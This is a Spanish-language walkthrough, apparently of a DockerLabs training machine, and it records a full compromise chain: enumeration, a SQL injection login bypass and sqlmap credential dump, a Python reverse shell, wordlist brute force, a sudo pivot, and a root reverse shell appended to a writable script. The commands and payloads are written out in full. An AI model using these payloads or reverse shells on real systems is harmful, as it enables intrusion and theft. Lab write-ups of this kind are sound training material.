## Fase de Reconocimiento y Descubrimiento (Enumeración)

### Escaneo de Puertos (Nmap)
Realizamos un escaneo de puertos inicial con nmap para identificar los servicios activos:

![[Pasted image 20260701221336.png]]

**Servicios identificados:**
* **Puerto 22/TCP (SSH):** Puerto abierto para control remoto. Ver teoría en [[Pentesting Notes/1_Enumeration/SSH\|SSH.md]].
* **Puerto 80/TCP (HTTP):** Servidor web expuesto. Ver teoría en [[Pentesting Notes/1_Enumeration/HTTP & HTTPS\|HTTP & HTTPS.md]].

---

## Enumeración Web

### Inspección de Tecnologías y Web (WhatWeb)
Evaluamos el sitio web utilizando whatweb:

![[Pasted image 20260701221430.png]]

* **Hallazgo:** Identificamos que el sitio utiliza la librería JQuery. Es importante registrar la versión en caso de que existan vulnerabilidades públicas asociadas.

Al ingresar al sitio web, se muestra un diseño de casino:

![[Pasted image 20260701221545.png]]

Los botones principales no cuentan con funcionalidad, excepto por el botón de login.

### Fuzzing de Directorios (ffuf)
Realizamos un escaneo de directorios con ffuf para buscar recursos o rutas de interés:

```bash
ffuf -w /usr/share/wordlist/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt:FUZZ -u 'http://172.17.0.2/FUZZ' -c -e .php,.html,.py,.txt,.bak -ic
```

* **Hallazgo:** Identificamos el directorio `/login_page/`, el cual contiene múltiples archivos PHP como `db.php`, `auth.php` y la página de login:

![[Pasted image 20260701221856.png]]

Accedemos a la página de login:

![[Pasted image 20260701221956.png]]

---

## Fase de Explotación / Intrusión

### Identificación y Explotación de SQL Injection (SQLMap)
Al ingresar caracteres especiales (comillas simples) en el formulario de login, la aplicación devuelve un error de sintaxis SQL:

![[Pasted image 20260701222042.png]]

Esto nos confirma la presencia de una inyección SQL (SQLi). Ver teoría en [[Pentesting Notes/Web/Vulnerabilities/01-SQL_Injection/Cheat Sheet\|SQL Injection Cheat Sheet]].

Logramos saltarnos el formulario (login bypass) utilizando un payload clásico de inyección:

```sql
admin' or 1=1 -- -
```

![[Pasted image 20260701222255.png]]

Sin embargo, el bypass no nos proporciona información crítica de forma directa. Para extraer la base de datos completa de forma estructurada, utilizamos sqlmap apuntando al endpoint de autenticación `/login_page/auth.php` enviando parámetros POST:

```bash
sqlmap -u "http://172.17.0.2/login_page/auth.php" --data "usuario=admin&contraseña=test" -D users -T usuarios --dump
```

![[Pasted image 20260701232410.png]]

* **Resultado:** sqlmap dumpea con éxito la tabla `usuarios` de la base de datos `users`, revelando las siguientes credenciales: `joe:MiClaveEsInhackeable`.

### Ejecución Remota de Comandos (RCE) y Acceso Inicial
Iniciamos sesión en la web utilizando las credenciales obtenidas (`joe:MiClaveEsInhackeable`), lo cual nos da acceso a un panel administrativo que permite ejecutar código Python:

![[Pasted image 20260701232613.png]]

El panel no sanitiza los inputs, lo que nos permite ejecutar comandos del sistema directamente:

![[Pasted image 20260701233119.png]]

Utilizamos el entorno de Python para spawnear una shell inversa hacia nuestra máquina atacante:

```python
import os;os.system('bash -c "bash -i >& /dev/tcp/172.17.0.1/4242 0>&1"')
```

Obtenemos con éxito una shell interactiva como el usuario de servicios web `www-data`.

---

## Escalada de Privilegios

### Pivotaje de Usuario (`www-data` a `joe`)
Enumeramos los archivos locales de la máquina tras obtener acceso inicial:

![[Pasted image 20260701222250.png]]

![[Pasted image 20260702003123.png]]

* **Hallazgo:** Descubrimos un archivo de texto oculto llamado `.hidden_text.txt` que contiene un listado de palabras en mayúsculas relacionadas con GTA San Andreas.
* **Preparación de Wordlist:** Para realizar un ataque de fuerza bruta sobre los usuarios del sistema, convertimos todas las palabras a minúsculas para generar un diccionario limpio:
  ```bash
  tr '[:upper:]' '[:lower:]' < .hidden_text.txt > nuevodiccionario.txt
  ```
* **Ataque de Fuerza Bruta:** Verificamos los usuarios locales en `/etc/passwd` e identificamos a `joe` y `luciano`. Realizamos un ataque de fuerza bruta utilizando el nuevo diccionario contra el servicio SSH o comando su:

![[Pasted image 20260702003252.png]]

* **Resultado:** Logramos autenticarnos como el usuario `joe`.

### Pivotaje de Usuario (`joe` a `luciano`)
Como el usuario `joe`, listamos los privilegios de sudo (`sudo -l`):

* **Vector:** El usuario `joe` puede ejecutar la shell de posh (`/bin/posh` o `/usr/bin/posh`) como el usuario `luciano` sin contraseña. Ver teoría en [[Pentesting Notes/3_Post-Explotation/Linux Privilage Escalation/Permissions\|Permissions.md]].
* **Explotación:**
  ```bash
  sudo -u luciano /bin/posh
  ```

### Escalada Final a Root
Una vez dentro como el usuario `luciano`, revisamos sus privilegios de ejecución de comandos.

* **Vector:** El usuario `luciano` puede ejecutar como `root` un script de shell ubicado en su directorio de home: `/home/luciano/script.sh`.
* **Explotación:** Al tener permisos de escritura sobre el script `/home/luciano/script.sh`, le añadimos una línea de comandos que nos devuelva una shell inversa con privilegios de root:

```bash
echo 'bash -c "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1"' >> /home/luciano/script.sh
```

Ejecutamos el script utilizando privilegios de sudo:
```bash
sudo /home/luciano/script.sh
```

![[Pasted image 20260702003400.png]]

¡Recibimos la conexión inversa en el puerto 4444 obteniendo una shell interactiva como el usuario root!

---

## Relaciones y Conceptos
* **Teoría:** [[Pentesting Notes/Web/Vulnerabilities/01-SQL_Injection/Cheat Sheet\|SQL Injection Cheat Sheet]], [[Pentesting Notes/3_Post-Explotation/Linux Privilage Escalation/Permissions\|Linux Privilege Escalation - Permissions.md]], [[Pentesting Notes/1_Enumeration/SSH\|SSH.md]]
* **Laboratorios Relacionados:** [[Laboratorios/DockerLabs/Facil/ApiBase\|ApiBase]] (Comparte uso de SQLi/SQLmap), [[Laboratorios/DockerLabs/MuyFacil/Hedgehog\|Hedgehog]] (Comparte técnica de manipulación de wordlists para fuerza bruta)